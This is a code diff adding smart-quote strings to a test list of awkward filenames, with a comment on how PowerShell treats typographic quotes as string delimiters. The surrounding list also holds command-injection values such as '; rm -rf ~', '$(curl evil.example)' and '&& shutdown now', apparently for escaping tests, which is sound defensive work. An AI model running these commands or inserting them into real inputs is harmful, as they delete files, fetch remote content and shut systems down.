@@ -92,6 +92,13 @@ NASTY = [
     "cjk \u4e2d\u6587 here",
     "rtl \u202e override",
     "quote'in\"middle`and$all",
+    # PowerShell accepts typographic quotes as string delimiters, so these
+    # escape a single-quoted string unless doubled. A smart apostrophe reaches
+    # a filename without anyone trying: "don't", pasted from a word processor.
+    "smart’apostrophe",
+    "smart‘open and ’close",
+    "smart‚quote",
+    "double“smart”quotes",
     "; rm -rf ~",
     "$(curl evil.example)",
     "&& shutdown now",
